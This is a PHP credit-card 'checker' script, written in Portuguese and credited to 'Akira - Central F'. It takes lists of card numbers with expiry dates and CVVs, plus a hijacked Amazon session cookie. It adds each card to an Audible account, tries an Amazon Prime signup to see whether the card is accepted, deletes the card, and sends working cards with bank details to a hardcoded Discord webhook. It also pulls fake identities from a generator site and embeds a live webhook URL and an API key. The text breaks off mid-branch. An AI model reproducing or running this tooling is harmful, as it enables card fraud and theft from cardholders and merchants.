<?php
ignore_user_abort();
error_reporting(0);
session_start();
#$time = time();

ini_set('memory_limit', '-1');

function trazer($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function getStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

 function multiexplode($string){
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
} 

function gerarCPF() {
    for ($i = 0; $i < 9; $i++) {
      $cpf[$i] = mt_rand(0, 9);
    }
  
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
      $soma += ($cpf[$i] * (10 - $i));
    }
    $resto = $soma % 11;
    $cpf[9] = ($resto < 2) ? 0 : (11 - $resto);
  
    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
      $soma += ($cpf[$i] * (11 - $i));
    }
    $resto = $soma % 11;
    $cpf[10] = ($resto < 2) ? 0 : (11 - $resto);
  
    return implode('', $cpf);
}

function generate_email() {
    $domains = array("gmail.com", "hotmail.com", "yahoo.com", "outlook.com");
    $domain = $domains[array_rand($domains)];
    $timestamp = time(); // timestamp atual em segundos
    $random_num = mt_rand(1, 10000); // número aleatório entre 1 e 10000
    $email = "user_" . $timestamp . "_" . $random_num . "@$domain";
    return $email;
}

// $email = generate_email();
// $cpf = gerarCPF();


extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$lista = ("$cc|$mes|$ano|$cvv");

$parte1 = substr($cc, 0, 4);
$parte2 = substr($cc, 4, 4);
$parte3 = substr($cc, 8, 4);
$parte4 = substr($cc, 12, 4);



function generateRandomString($length = 12)
{
    $characters       = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


#################################################
// by: bruxo


$cookie1 = $_POST['cookie1'];
$cookie = trim($cookie1);

/* $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://bins.su/");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Content-Type: application/x-www-form-urlencoded',
  'Host: bins.su'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.substr($cc, 0, 6).'&bank=&country=');
$dados1 = curl_exec($ch);
$bin = getStr($dados1, 'bins<table><tr><td>BIN</td><td>Country</td><td>Vendor</td><td>Type</td><td>Level</td><td>Bank</td></tr><tr><td>','</td><td>');
$pais = getStr($dados1, '<tr><td>'.$bin.'</td><td>','</td><td>');
$bandeira = getStr($dados1, '</td><td>'.$pais.'</td><td>','</td><td>');
$tipo = getStr($dados1, '</td><td>'.$bandeira.'</td><td>','</td><td>');
$nivel = getStr($dados1, '</td><td>'.$tipo.'</td><td>','</td><td>');
$banco = getStr($dados1, '</td><td>'.$nivel.'</td><td>','</td></tr>'); */

 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.checkout.com/tokens");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: *\*',
'authorization: pk_wf64cebluwwe46fsf7fgb3l5umk',
'content-type: application/json',
'origin: https://js.checkout.com',
'referer: https://js.checkout.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"type":"card","number":"'.$cc.'","expiry_month":11,"expiry_year":2028,"cvv":"483","name":"haikarajadas Regina","billing_address":{"address_line1":"Haikara Izakaya","city":"Paris","state":"IDF","zip":"75011","country":"FR"},"phone":{"number":"5519996831732"},"preferred_scheme":"","requestSource":"JS"}');
$puxarbins = curl_exec($ch);
$pais = getStr($puxarbins, '"issuer_country":"','",');
$bandeira = getStr($puxarbins, '"scheme":"','",');
$tipo = getStr($puxarbins, '"card_type":"','",');
$nivel = getStr($puxarbins, '"product_type":"','"');
$banco = getStr($puxarbins, '"issuer":"','",'); 
$info = "$bandeira - $banco - $tipo - $nivel - $pais";

/* $binn = substr($cc, 0, 6); // Substitua BIN_AQUI pelo número do BIN desejado
$api_key = "c18d60abec089bd57d4caff6973bfa72"; // Substitua pela sua chave de API

$url = "https://api.bincodes.com/bin/?format=json&api_key={$api_key}&bin={$binn}";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$result = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Erro ao obter informações: ' . curl_error($ch);
} else {
    $data = json_decode($result, true);
    if(isset($data['country'])){
        $pais = $data['country'];
        $bandeira = $data['card'];
        $tipo = $data['type'];
        $nivel = $data['level'];
        $banco = $data['bank'];
    }
}

curl_close($ch);*/

/* $binn = substr($cc, 0, 6); // Substitua BIN_AQUI pelo número do BIN desejado
#$api_key = "c18d60abec089bd57d4caff6973bfa72"; // Substitua pela sua chave de API

$url = "https://lookup.binlist.net/{$binn}"; #https://api.bincodes.com/bin/?format=json&api_key={$api_key}&bin={$binn}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$result = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Erro ao obter informações: ' . curl_error($ch);
} else {
    $data = json_decode($result, true);
    if(isset($data['country'])){
        $pais = $data['country']['name'];
        $bandeira = $data['scheme'];
        $tipo = $data['type'];
        $nivel = $data['brand'];
        $banco = isset($data['bank']['name']) ? $data['bank']['name'] : 'Desconhecido';
    }
} */

curl_close($ch);

$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookies.txt");
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookies.txt");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.4devs.com.br',
    'Accept: */*',
    'Sec-Fetch-Dest: empty',
    'Content-Type: application/x-www-form-urlencoded',
    'origin: https://www.4devs.com.br',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'referer: https://www.4devs.com.br/gerador_de_pessoas'));
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
  $end = curl_exec($ch);  

unlink($cookies);
$bruxo_dev77 = trazer($end, '"nome":"','"');
$cpf = getStr($end, '"cpf":"', '"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo");
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    "Host: www.amazon.com",
    "Cookie: $cookie",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
));
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);

$customerId = trazer($resp, '"customerID":"', '"');
$session_id = trazer($resp, '"sessionId":"', '"');
$token_delete = trazer($resp, '"serializedState":"', '"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.com/account/payments?ref=a_account_o_l2_nav_2");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Cookie: $cookie",
));
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$add_card = curl_exec($curl);
$tok = trazer($add_card, 'name="csrfToken" value="', '"');
$tokenbruxo = urlencode($tok);

if ($tok === null) {
 
$tok = trazer($add_card, 'data-csrf-token="','"');
$tokenbruxo = urlencode($tok);

}

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.com/unified-payment/update-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com$enco&relativeUrl=%2Fsubscription%2Fconfirmation&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Cookie: $cookie",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, "isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_paymentswidget_payments_list_choose_text&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_paymentswidget_payments_list_description&paymentsListTitleKey=adbl_paymentswidget_payments_list_title&selectedPaymentDescriptionKey=adbl_paymentswidget_selected_payment_description&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=false&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=true&showConfirmButton=false&showAddButton=false&showDeleteButtons=false&showEditButtons=true&showClosePaymentsListButton=false&isVerifyCvv=false&isDialog=false&selectPaymentOnSuccess=true&ref=a_sbscrptnConfrmtn_c9_edit&paymentType=CreditCard&addCreditCardNumber=$parte1%20$parte2%20$parte3%20$parte4&expirationMonth=$mes&expirationYear=$ano&fullName=$bruxo_dev77&csrfToken=$tokenbruxo&country=US&addressLine1=230%20Vesey%20St%20Suite%20203C&addressLine2=&zipCode=10281&state=NY&city=NEW%20YORK&useAsDefault=true&addressId=&accountHolderName=$bruxo_dev77");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$add_card = curl_exec($curl);
$card_id = trazer($gerar_cardID, '"paymentId": "', '"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/gp/prime/pipeline/membersignup");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.com",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$post_verify = curl_exec($curl);

$token_verify = trazer($post_verify, 'name="ppw-widgetState" value="','"');
$offerToken = trazer($post_verify, 'name="offerToken" value="','"');


$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.com",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, "ppw-jsEnabled=true&ppw-widgetState=$token_verify&ppw-widgetEvent=SavePaymentPreferenceEvent");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$post_verify2 = curl_exec($curl);

$card_id2 = trazer($post_verify2, '"preferencePaymentMethodIds":"[\"','\"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/hp/wlp/pipeline/actions");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.com",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
   "accept: */*",
));
curl_setopt($curl, CURLOPT_POSTFIELDS,"offerToken=$offertoken&session-id=$session_id&locationID=prime_confirm&primeCampaignId=SlashPrime&redirectURL=L2dwL3ByaW1l&cancelRedirectURL=Lw&location=prime_confirm&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&paymentMethodId=$card_id2&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&wlpLocation=prime_confirm&paymentMethodIdList=$card_id2");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$bruxo = curl_exec($curl);


$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.com/account/payments?ref=a_account_o_l2_nav_2&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
"Cookie: $cookie",
));
$resp = curl_exec($curl);

$a = trazer($resp, 'data-billing-address-id="', '"');
$b = trazer($resp, 'data-payment-id="', '"');
$c = trazer($resp, 'data-payment-id="', 'payment-type');
$c = trazer($c, 'data-csrf-token="', '"');
$d = trazer($resp, 'href="/account/payments', '">');
$cd = trazer($resp, 'data-tail="', '"');
$bruxoenc = urlencode($d);

$tipbruxo = trazer($resp, 'data-display-issuer-name="', '"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.com/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments$d&relativeUrl=%2Faccount%2Fpayments&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Accept-Encoding: gzip, deflate, br",
"Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie: $cookie",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, '
isMosaicMigrationRevampedEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isMfaForAddCardComplete=false&isVerifyCvv=false&ref=a_accountPayments_c3_0_delete&paymentId='.$b.'&billingAddressId='.$a.'&paymentType=CreditCard&tail=1558&accountHolderName=Iago%20Pedro%20Henrique%20Erick%20Baptista&isValid=true&isDefault=true&issuerName=Visa&displayIssuerName=Visa&bankName=&csrfToken='.$c.'&index=0&consentState=OptedIn');
 $resp   = curl_exec($curl);

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.com/payments/optimus/delete?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments$d&relativeUrl=%2Faccount%2Fpayments&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Accept-Encoding: gzip, deflate, br",
"Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie: $cookie",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, 'isMosaicMigrationRevampedEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isMfaForAddCardComplete=false&isVerifyCvv=false&isDialog=false&selectPaymentOnSuccess=false&ref=a_accountPayments_c3_0_delete&paymentId='.$b.'&billingAddressId='.$a.'&paymentType=CreditCard&tail=5452&accountHolderName=dasdasda&isValid=true&isDefault=true&issuerName=MasterCard&displayIssuerName=MasterCard&bankName=&csrfToken='.$c.'&index=0&consentState=OptedIn&statusStringKey=adbl_paymentswidget_delete_payment_success&statusSuccess=true&csrfTokenValid=true');
 $resp   = curl_exec($curl);

if (strpos($resp, 'Card successfully deleted.')) {
        $msg  = '✅';
        $err  = "REMOVIDO: $msg $err1";
    } else {
        $msg = '❌';
        $err = "REMOVIDO: $msg $err1";
    }

$ip = $_SERVER['REMOTE_ADDR'];

 if (strpos($bruxo, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {

    echo "<br><font color='white'><span style='background: #4caf50;color: white;' class='badge bg-gold'>🎁 @ Aprovada</span> » $lista » <font color='white'><span style='background: #4caf50;color: white;' class='badge bg-gold'>Removido: $msg</span> » <font color='white'><span style='background: #4caf50;color: white;' class='badge bg-gold'>[ Cartão Aprovado ]</span> » @CentralF</b></font><br>";
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://discord.com/api/webhooks/1283615050418098207/umGPQ4VZEk15G9dBdBDxWlv9cf5so2CsIb348v0LJlyFa01MpVJKwElNaTtcppiWGwS9'); /* Link Webhook Live */
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEFILE, "$cookie");
    curl_setopt($ch, CURLOPT_COOKIEJAR, "$cookie");
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: application/json',
    'accept-language: en',
    'content-type: application/json',
    'origin: https://discohook.org',
    'referer: https://discohook.org/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        "content" => null,
        "embeds" => [
            [
                "title" => "・Transação Aprovada",
                "description" => "・Cartão:\n```$lista```\n・Info: `$info`\n\n・Retorno: [ Cartão vinculado com sucesso. ]",
                "color" => 2829617,
                "footer" => [
                    "text" => "Checker by Akira - Central F"
                ]
            ]
        ],
        "attachments" => []
    ]));
        $send = curl_exec($ch);
}  elseif (strpos($bruxo, 'Desculpe. Não foi possível concluir sua inscrição do Prime no momento. Se você ainda quiser participar do Prime, é possível se inscrever durante a finalização da compra.')) {

        echo "<br><font color='white'><span style='background: #4caf50;color: white;' class='badge bg-gold'>🎁 @ Aprovada</span> » $lista » <font color='white'><span style='background: #4caf50;color: white;' class='badge bg-gold'>Removido: $msg</span> » <font color='white'><span style='background: #4caf50;color: white;' class='badge bg-gold'>[ Cartão Aprovado ]</span> » @CentralF</b></font><br>";
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://discord.com/api/webhooks/1283615050418098207/umGPQ4VZEk15G9dBdBDxWlv9cf5so2CsIb348v0LJlyFa01MpVJKwElNaTtcppiWGwS9'); /* Link Webhook Live */
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEFILE, "$cookie");
    curl_setopt($ch, CURLOPT_COOKIEJAR, "$cookie");
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: application/json',
    'accept-language: en',
    'content-type: application/json',
    'origin: https://discohook.org',
    'referer: https://discohook.org/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        "content" => null,
        "embeds" => [
            [
                "title" => "・Transação Aprovada",
                "description" => "・Cartão:\n```$lista```\n・Info: `$info`\n\n・Retorno: [ Cartão vinculado com sucesso. ]",
                "color" => 2829617,
                "footer" => [
                    "text" => "Checker by Akira - Central F"
                ]
            ]
        ],
        "attachments" => []
    ]));
        $send = curl_exec($ch);
    }elseif (strpos($bruxo, 'InvalidInput')) {
    
    echo "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>Reprovada</span> » $lista » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>Removido: $msg</span> » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ Cartão Inválido ]</span> » @CentralF</b></font><br>";
    curl_close($curl);
    exit();

} elseif (strpos($bruxo, 'HARDVET_VERIFICATION_FAILED')) {

    echo "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>Reprovada</span> » $lista » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>Removido: $msg</span> » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ Pagamento Recusado ]</span> » @CentralF</b></font><br>";
    curl_close($curl);
    exit();
} else {
